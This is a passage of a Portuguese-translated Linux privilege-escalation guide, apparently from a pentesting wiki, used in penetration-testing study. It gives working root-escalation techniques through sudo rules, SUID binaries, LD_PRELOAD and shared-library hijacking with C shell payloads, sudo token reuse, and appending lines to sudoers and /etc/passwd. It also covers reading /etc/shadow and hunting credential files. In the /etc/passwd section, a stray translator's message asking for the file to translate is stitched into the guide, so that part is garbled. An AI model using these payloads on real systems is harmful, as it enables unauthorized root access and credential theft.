<policy user="root">
<allow own="fi.w1.wpa_supplicant1"/>
<allow send_destination="fi.w1.wpa_supplicant1"/>
<allow send_interface="fi.w1.wpa_supplicant1"/>
<allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```
**Aprenda como enumerate e exploit uma comunicação D-Bus aqui:**


{{#ref}}
d-bus-enumeration-and-command-injection-privilege-escalation.md
{{#endref}}

## **Rede**

É sempre interessante enumerate a rede e descobrir a posição da máquina.

### Genérico enumeration
```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#Files used by network services
lsof -i
```
### Portas abertas

Sempre verifique os serviços de rede em execução na máquina com os quais você não conseguiu interagir antes de acessá-la:
```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
```
### Sniffing

Verifique se você consegue sniff traffic. Se conseguir, pode ser capaz de capturar algumas credentials.
```
timeout 1 tcpdump
```
## Usuários

### Enumeração Genérica

Verifique **who** você é, quais **privileges** você tem, quais **users** estão nos sistemas, quais podem **login** e quais têm **root privileges:**
```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
w
#Login history
last | tail
#Last log of each user
lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```
### UID grande

Algumas versões do Linux foram afetadas por um bug que permite a usuários com **UID > INT_MAX** elevar privilégios. Mais informações: [here](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [here](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) e [here](https://twitter.com/paragonsec/status/1071152249529884674).\
**Exploit it** using: **`systemd-run -t /bin/bash`**

### Grupos

Verifique se você é **membro de algum grupo** que poderia conceder root privileges:


{{#ref}}
interesting-groups-linux-pe/
{{#endref}}

### Área de transferência

Verifique se há algo interessante na área de transferência (se possível)
```bash
if [ `which xclip 2>/dev/null` ]; then
echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
echo "Highlighted text: "`xclip -o 2>/dev/null`
elif [ `which xsel 2>/dev/null` ]; then
echo "Clipboard: "`xsel -ob 2>/dev/null`
echo "Highlighted text: "`xsel -o 2>/dev/null`
else echo "Not found xsel and xclip"
fi
```
### Política de Senhas
```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```
### Senhas conhecidas

Se você **sabe alguma senha** do ambiente **tente fazer login como cada usuário** usando essa senha.

### Su Brute

Se não se importar em gerar muito ruído e os binários `su` e `timeout` estiverem presentes no computador, você pode tentar um brute-force em usuários usando [su-bruteforce](https://github.com/carlospolop/su-bruteforce).\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) com o parâmetro `-a` também tenta realizar brute-force em usuários.

## Abusos de PATH gravável

### $PATH

Se você descobrir que pode **escrever dentro de alguma pasta do $PATH** você pode ser capaz de escalar privilégios criando **um backdoor dentro da pasta gravável** com o nome de algum comando que será executado por um usuário diferente (idealmente root) e que **não seja carregado a partir de uma pasta que esteja antes** da sua pasta gravável no $PATH.

### SUDO and SUID

Você pode estar autorizado a executar algum comando usando sudo ou os comandos podem ter o bit suid. Verifique usando:
```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```
Alguns **comandos inesperados permitem que você leia e/ou escreva arquivos ou até execute um comando.** Por exemplo:
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```
### NOPASSWD

A configuração do Sudo pode permitir que um usuário execute algum comando com os privilégios de outro usuário sem conhecer a senha.
```
$ sudo -l
User demo may run the following commands on crashlab:
(root) NOPASSWD: /usr/bin/vim
```
Neste exemplo o usuário `demo` pode executar `vim` como `root`; agora é trivial obter um shell adicionando uma ssh key no diretório `root` ou chamando `sh`.
```
sudo vim -c '!sh'
```
### SETENV

Esta diretiva permite ao usuário **definir uma variável de ambiente** ao executar algo:
```bash
$ sudo -l
User waldo may run the following commands on admirer:
(ALL) SETENV: /opt/scripts/admin_tasks.sh
```
Este exemplo, **baseado na máquina HTB Admirer**, estava **vulnerável** a **PYTHONPATH hijacking** para carregar uma biblioteca python arbitrária enquanto executava o script como root:
```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```
### BASH_ENV preservado via sudo env_keep → root shell

Se o sudoers preservar `BASH_ENV` (por exemplo, `Defaults env_keep+="ENV BASH_ENV"`), você pode aproveitar o comportamento de inicialização não interativo do Bash para executar código arbitrário como root ao invocar um comando permitido.

- Por que funciona: Para shells não interativos, o Bash avalia `$BASH_ENV` e faz source desse arquivo antes de executar o script alvo. Muitas regras do sudo permitem rodar um script ou um wrapper de shell. Se `BASH_ENV` for preservado pelo sudo, seu arquivo será sourced com privilégios de root.

- Requisitos:
- Uma regra do sudo que você pode executar (qualquer target que invoque `/bin/bash` de forma não interativa, ou qualquer bash script).
- `BASH_ENV` presente em `env_keep` (verifique com `sudo -l`).

- PoC:
```bash
cat > /dev/shm/shell.sh <<'EOF'
#!/bin/bash
/bin/bash
EOF
chmod +x /dev/shm/shell.sh
BASH_ENV=/dev/shm/shell.sh sudo /usr/bin/systeminfo   # or any permitted script/binary that triggers bash
# You should now have a root shell
```
- Hardening:
- Remova `BASH_ENV` (e `ENV`) de `env_keep`, prefira `env_reset`.
- Evite wrappers de shell para comandos permitidos via sudo; use binários mínimos.
- Considere sudo I/O logging e alertas quando env vars preservadas forem usadas.

### Caminhos que burlam a execução do sudo

**Ir** para ler outros arquivos ou usar **symlinks**. Por exemplo no arquivo sudoers: _hacker10 ALL= (root) /bin/less /var/log/\*_
```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```
Se um **wildcard** for usado (\*), fica ainda mais fácil:
```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```
**Contramedidas**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Comando Sudo/Binário SUID sem caminho do comando

Se a **permissão sudo** for dada a um único comando **sem especificar o caminho**: _hacker10 ALL= (root) less_ você pode explorá-la alterando a variável PATH
```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```
Esta técnica também pode ser usada se um binário **suid** **executa outro comando sem especificar o caminho para ele (sempre verifique com** _**strings**_ **o conteúdo de um binário SUID estranho)**.

[Payload examples to execute.](payloads-to-execute.md)

### Binário SUID com caminho do comando

Se o binário **suid** **executa outro comando especificando o caminho**, então, você pode tentar **exportar uma função** com o nome do comando que o arquivo suid está chamando.

Por exemplo, se um binário suid chama _**/usr/sbin/service apache2 start**_ você precisa tentar criar a função e exportá-la:
```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```
Então, quando você chamar o suid binary, essa função será executada

### LD_PRELOAD & **LD_LIBRARY_PATH**

A variável de ambiente **LD_PRELOAD** é usada para especificar uma ou mais bibliotecas compartilhadas (.so) a serem carregadas pelo loader antes de todas as outras, incluindo a biblioteca C padrão (`libc.so`). Esse processo é conhecido como pré-carregamento de biblioteca.

No entanto, para manter a segurança do sistema e evitar que esse recurso seja explorado, especialmente em executáveis **suid/sgid**, o sistema impõe certas condições:

- O loader ignora **LD_PRELOAD** para executáveis onde o ID de usuário real (_ruid_) não coincide com o ID de usuário efetivo (_euid_).
- Para executáveis com suid/sgid, apenas bibliotecas em caminhos padrão que também sejam suid/sgid são pré-carregadas.

A escalada de privilégios pode ocorrer se você tiver a capacidade de executar comandos com `sudo` e a saída de `sudo -l` incluir a declaração **env_keep+=LD_PRELOAD**. Essa configuração permite que a variável de ambiente **LD_PRELOAD** persista e seja reconhecida mesmo quando comandos são executados com `sudo`, potencialmente levando à execução de código arbitrário com privilégios elevados.
```
Defaults        env_keep += LD_PRELOAD
```
Salvar como **/tmp/pe.c**
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
Em seguida, **compile-o** usando:
```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
Finalmente, **escalate privileges** em execução
```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```
> [!CAUTION]
> Um privesc similar pode ser explorado se o atacante controlar a variável de ambiente **LD_LIBRARY_PATH**, porque ele controla o caminho onde as bibliotecas serão procuradas.
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```
### SUID Binary – .so injection

Ao encontrar um binary com permissões **SUID** que pareça incomum, é uma boa prática verificar se ele está carregando arquivos **.so** corretamente. Isso pode ser verificado executando o seguinte comando:
```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```
Por exemplo, encontrar um erro como _"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)"_ sugere um potencial para exploração.

Para explorar isso, deve-se criar um arquivo C, por exemplo _"/path/to/.config/libcalc.c"_, contendo o seguinte código:
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
Este código, uma vez compilado e executado, tem como objetivo elevar privilégios manipulando permissões de arquivos e executando um shell com privilégios elevados.

Compile o arquivo C acima em um objeto compartilhado (.so) com:
```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```
Finalmente, executar o binário SUID afetado deve acionar o exploit, permitindo um possível comprometimento do sistema.

## Shared Object Hijacking
```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```
Agora que encontramos um SUID binary que carrega uma library de uma pasta onde podemos escrever, vamos criar a library nessa pasta com o nome necessário:
```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
setresuid(0,0,0);
system("/bin/bash -p");
}
```
Se você receber um erro como
```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```
isso significa que a biblioteca que você gerou precisa ter uma função chamada `a_function_name`.

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) é uma lista curada de binários Unix que podem ser explorados por um atacante para contornar restrições de segurança locais. [**GTFOArgs**](https://gtfoargs.github.io/) é o mesmo, mas para casos onde você pode **apenas injetar argumentos** em um comando.

O projeto coleta funções legítimas de binários Unix que podem ser abusadas para escapar de shells restritos, escalar ou manter privilégios elevados, transferir arquivos, spawn bind and reverse shells, e facilitar outras tarefas de post-exploitation.

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'


{{#ref}}
https://gtfobins.github.io/
{{#endref}}


{{#ref}}
https://gtfoargs.github.io/
{{#endref}}

### FallOfSudo

Se você consegue acessar `sudo -l`, pode usar a ferramenta [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) para verificar se ela encontra formas de explorar qualquer regra do sudo.

### Reusing Sudo Tokens

Em casos onde você tem **sudo access** mas não a senha, é possível escalar privilégios aguardando a execução de um comando sudo e então sequestrando o token de sessão.

Requisitos para escalar privilégios:

- Você já tem um shell como o usuário "_sampleuser_"
- "_sampleuser_" tenha **usado `sudo`** para executar algo nos **últimos 15 minutos** (por padrão essa é a duração do token sudo que nos permite usar `sudo` sem inserir nenhuma senha)
- `cat /proc/sys/kernel/yama/ptrace_scope` é 0
- `gdb` está acessível (você deve ser capaz de fazer upload dele)

(Você pode habilitar temporariamente `ptrace_scope` com `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` ou permanentemente modificando `/etc/sysctl.d/10-ptrace.conf` e definindo `kernel.yama.ptrace_scope = 0`)

Se todos esses requisitos forem atendidos, **você pode escalar privilégios usando:** [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)

- O **primeiro exploit** (`exploit.sh`) criará o binário `activate_sudo_token` em _/tmp_. Você pode usá-lo para **ativar o sudo token na sua sessão** (você não obterá automaticamente um root shell, execute `sudo su`):
```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```
- O **segundo exploit** (`exploit_v2.sh`) criará um shell sh em _/tmp_ **de propriedade do root com setuid**
```bash
bash exploit_v2.sh
/tmp/sh -p
```
- O **terceiro exploit** (`exploit_v3.sh`) irá **criar um sudoers file** que torna **sudo tokens eternos** e permite que todos os usuários usem sudo
```bash
bash exploit_v3.sh
sudo su
```
### /var/run/sudo/ts/\<Username>

Se você tem **permissões de escrita** na pasta ou em qualquer um dos arquivos criados dentro dela, você pode usar o binário [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools) para **criar um sudo token para um usuário e PID**.\
Por exemplo, se você puder sobrescrever o arquivo _/var/run/sudo/ts/sampleuser_ e tiver uma shell como esse usuário com PID 1234, você pode **obter privilégios sudo** sem precisar saber a senha, fazendo:
```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```
### /etc/sudoers, /etc/sudoers.d

O arquivo `/etc/sudoers` e os arquivos dentro de `/etc/sudoers.d` configuram quem pode usar `sudo` e como. Esses arquivos **por padrão só podem ser lidos pelo usuário root e pelo grupo root**.\
**Se** você puder **ler** este arquivo poderá **obter algumas informações interessantes**, e se você puder **escrever** qualquer arquivo será capaz de **escalar privilégios**.
```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```
Se você pode escrever, pode abusar dessa permissão.
```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```
Outra maneira de abusar dessas permissões:
```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```
### DOAS

Existem algumas alternativas ao binário `sudo`, como o `doas` do OpenBSD. Lembre-se de verificar sua configuração em `/etc/doas.conf`
```
permit nopass demo as root cmd vim
```
### Sudo Hijacking

Se souber que um **usuário normalmente se conecta a uma máquina e usa `sudo`** para escalar privilégios e você obteve um shell nesse contexto de usuário, você pode **criar um novo executável sudo** que irá executar seu código como root e depois o comando do usuário. Em seguida, **modifique o $PATH** do contexto do usuário (por exemplo adicionando o novo caminho em .bash_profile) para que, quando o usuário executar sudo, seu executável sudo seja executado.

Observe que se o usuário usar um shell diferente (não bash) você precisará modificar outros arquivos para adicionar o novo caminho. Por exemplo [sudo-piggyback](https://github.com/APTy/sudo-piggyback) modifica `~/.bashrc`, `~/.zshrc`, `~/.bash_profile`. Você pode encontrar outro exemplo em [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py)

Ou executando algo como:
```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```
## Biblioteca Compartilhada

### ld.so

O arquivo `/etc/ld.so.conf` indica **de onde vêm os arquivos de configuração carregados**. Tipicamente, este arquivo contém o seguinte caminho: `include /etc/ld.so.conf.d/*.conf`

Isso significa que os arquivos de configuração em `/etc/ld.so.conf.d/*.conf` serão lidos. Esses arquivos de configuração **apontam para outras pastas** onde **bibliotecas** serão **procuradas**. Por exemplo, o conteúdo de `/etc/ld.so.conf.d/libc.conf` é `/usr/local/lib`. **Isso significa que o sistema irá procurar bibliotecas dentro de `/usr/local/lib`**.

Se, por algum motivo, **um usuário tiver permissões de escrita** em qualquer um dos caminhos indicados: `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, qualquer arquivo dentro de `/etc/ld.so.conf.d/` ou qualquer pasta referenciada pelo arquivo de configuração em `/etc/ld.so.conf.d/*.conf`, ele pode ser capaz de escalar privilégios.\
Veja **como explorar essa má-configuração** na página a seguir:


{{#ref}}
ld.so.conf-example.md
{{#endref}}

### RPATH
```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
0x00000001 (NEEDED)                     Shared library: [libc.so.6]
0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x0068c000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x005bb000)
```
Ao copiar a lib para `/var/tmp/flag15/`, ela será usada pelo programa nesse local conforme especificado na variável `RPATH`.
```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x005b0000)
libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x00737000)
```
Em seguida, crie uma evil library em `/var/tmp` com `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6`
```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
char *file = SHELL;
char *argv[] = {SHELL,0};
setresuid(geteuid(),geteuid(), geteuid());
execve(file,argv,0);
}
```
## Capacidades

As capacidades do Linux fornecem um **subconjunto dos privilégios root disponíveis para um processo**. Isso efetivamente divide os **privilégios do root em unidades menores e distintas**. Cada uma dessas unidades pode então ser concedida independentemente a processos. Dessa forma, o conjunto completo de privilégios é reduzido, diminuindo os riscos de exploração.\
Leia a seguinte página para **aprender mais sobre capacidades e como abusar delas**:


{{#ref}}
linux-capabilities.md
{{#endref}}

## Permissões de diretório

Em um diretório, o **bit para "execute"** implica que o usuário afetado pode "**cd**" para dentro da pasta.\
O **"read"** bit implica que o usuário pode **listar** os **arquivos**, e o **"write"** bit implica que o usuário pode **excluir** e **criar** novos **arquivos**.

## ACLs

Listas de Controle de Acesso (ACLs) representam a camada secundária de permissões discricionárias, capazes de **sobrepor as permissões tradicionais ugo/rwx**. Essas permissões aumentam o controle sobre o acesso a arquivos ou diretórios ao permitir ou negar direitos a usuários específicos que não são os proprietários nem fazem parte do grupo. Esse nível de **granularidade assegura um gerenciamento de acesso mais preciso**. Mais detalhes podem ser encontrados [**here**](https://linuxconfig.org/how-to-manage-acls-on-linux).

**Dê** ao usuário "kali" permissões de "read" e "write" sobre um arquivo:
```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```
**Obter** arquivos com ACLs específicos do sistema:
```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```
## Abrir sessões shell

Em **versões antigas** você pode realizar um **hijack** de alguma sessão de **shell** de um usuário diferente (**root**).\
Em **versões mais recentes** você só poderá **conectar-se** a screen sessions do **seu próprio usuário**. No entanto, você pode encontrar **informações interessantes dentro da sessão**.

### screen sessions hijacking

**Listar screen sessions**
```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions
```
![](<../../images/image (141).png>)

**Anexar a uma sessão**
```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```
## Sequestro de sessões tmux

Isso era um problema com **versões antigas do tmux**. Eu não consegui sequestrar uma sessão tmux (v2.1) criada pelo root como um usuário sem privilégios.

**Listar sessões tmux**
```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```
![](<../../images/image (837).png>)

**Anexar a uma sessão**
```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```
Confira **Valentine box from HTB** como exemplo.

## SSH

### Debian OpenSSL Predictable PRNG - CVE-2008-0166

Todas as chaves SSL e SSH geradas em sistemas baseados em Debian (Ubuntu, Kubuntu, etc) entre setembro de 2006 e 13 de maio de 2008 podem ser afetadas por esse bug.\
Esse bug ocorre ao criar uma nova ssh key nesses SOs, já que **apenas 32.768 variações eram possíveis**. Isso significa que todas as possibilidades podem ser calculadas e **tendo a ssh public key você pode buscar a chave privada correspondente**. Você pode encontrar as possibilidades calculadas aqui: [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)

### Valores de configuração interessantes do SSH

- **PasswordAuthentication:** Especifica se a autenticação por senha é permitida. O padrão é `no`.
- **PubkeyAuthentication:** Especifica se a autenticação por chave pública é permitida. O padrão é `yes`.
- **PermitEmptyPasswords**: Quando a autenticação por senha está permitida, especifica se o servidor permite login em contas com senhas vazias. O padrão é `no`.

### PermitRootLogin

Especifica se o root pode fazer login usando ssh, o padrão é `no`. Valores possíveis:

- `yes`: root pode fazer login usando senha e chave privada
- `without-password` or `prohibit-password`: root só pode fazer login com uma chave privada
- `forced-commands-only`: root só pode fazer login usando chave privada e se as opções de comandos estiverem especificadas
- `no` : não

### AuthorizedKeysFile

Especifica arquivos que contêm as chaves públicas que podem ser usadas para autenticação de usuário. Pode conter tokens como `%h`, que serão substituídos pelo diretório home. **Você pode indicar caminhos absolutos** (iniciando em `/`) ou **caminhos relativos ao home do usuário**. Por exemplo:
```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```
Essa configuração indica que, se você tentar fazer login com a chave **private** do usuário "**testusername**", o ssh irá comparar a public key da sua key com as localizadas em `/home/testusername/.ssh/authorized_keys` e `/home/testusername/access`

### ForwardAgent/AllowAgentForwarding

SSH agent forwarding permite que você **use your local SSH keys instead of leaving keys** (sem passphrases!) no seu servidor. Assim, você poderá **jump** via ssh **to a host** e, a partir dele, **jump to another** host **using** the **key** localizado no seu **initial host**.

Você precisa configurar essa opção em `$HOME/.ssh.config` assim:
```
Host example.com
ForwardAgent yes
```
Observe que se `Host` for `*`, toda vez que o usuário se conectar a uma máquina diferente, esse host poderá acessar as chaves (o que é um problema de segurança).

O arquivo `/etc/ssh_config` pode **sobrescrever** estas **opções** e permitir ou negar essa configuração.\
O arquivo `/etc/sshd_config` pode **permitir** ou **negar** ssh-agent forwarding com a palavra-chave `AllowAgentForwarding` (o padrão é permitir).

Se você descobrir que Forward Agent está configurado em um ambiente, leia a página a seguir pois **you may be able to abuse it to escalate privileges**:


{{#ref}}
ssh-forward-agent-exploitation.md
{{#endref}}

## Arquivos Interessantes

### Arquivos de perfil

O arquivo `/etc/profile` e os arquivos em `/etc/profile.d/` são **scripts que são executados quando um usuário inicia um novo shell**. Portanto, se você puder **escrever ou modificar qualquer um deles você pode escalate privileges**.
```bash
ls -l /etc/profile /etc/profile.d/
```
Se algum script de perfil estranho for encontrado, você deve verificá-lo em busca de **detalhes sensíveis**.

### Arquivos Passwd/Shadow

Dependendo do sistema operacional, os arquivos `/etc/passwd` e `/etc/shadow` podem estar usando um nome diferente ou pode haver um backup. Portanto, é recomendado **encontrar todos eles** e **verificar se você pode lê-los** para ver **se há hashes** dentro dos arquivos:
```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```
Em algumas ocasiões, é possível encontrar **password hashes** dentro do arquivo `/etc/passwd` (ou equivalente)
```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```
### /etc/passwd gravável

Primeiro, gere uma senha com um dos seguintes comandos.
```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```
Por favor, envie o conteúdo do arquivo src/linux-hardening/privilege-escalation/README.md que você quer traduzido.  
Deseja também que eu adicione uma linha criando o usuário `hacker` com uma senha gerada? Se sim, confirme se quer apenas mostrar a senha gerada no texto traduzido ou incluir também um comando (por exemplo, useradd/echo | passwd).  
Observação: seguirei sua instrução de não traduzir código, nomes de técnicas, links, paths, tags nem adicionar conteúdo extra além da tradução solicitada.
```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```
Ex.: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

Agora você pode usar o comando `su` com `hacker:hacker`

Alternativamente, você pode usar as linhas a seguir para adicionar um usuário dummy sem senha.\
AVISO: isso pode comprometer a segurança atual da máquina.
```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```
NOTA: Em plataformas BSD `/etc/passwd` está localizado em `/etc/pwd.db` e `/etc/master.passwd`, além disso `/etc/shadow` é renomeado para `/etc/spwd.db`.

Você deve verificar se consegue **escrever em alguns arquivos sensíveis**. Por exemplo, consegue escrever em algum **arquivo de configuração de serviço**?
```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```
Por exemplo, se a máquina estiver executando um servidor **tomcat** e você puder **modificar o arquivo de configuração do serviço Tomcat dentro de /etc/systemd/,** então você pode modificar as linhas:
```
ExecStart=/path/to/backdoor
User=root
Group=root
```
Sua backdoor será executada na próxima vez que o tomcat for iniciado.

### Verificar Pastas

As seguintes pastas podem conter backups ou informações interessantes: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (Provavelmente você não conseguirá ler a última, mas tente)
```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```
### Localização Estranha/Owned arquivos
```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
do printf "  Group $g:\n";
find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
done
done
```
### Arquivos modificados nos últimos minutos
```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```
### Arquivos DB do Sqlite
```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```
### \*\_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml arquivos
```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```
### Arquivos ocultos
```bash
find / -type f -iname ".*" -ls 2>/dev/null
```
### **Script/Binaries no PATH**
```bash
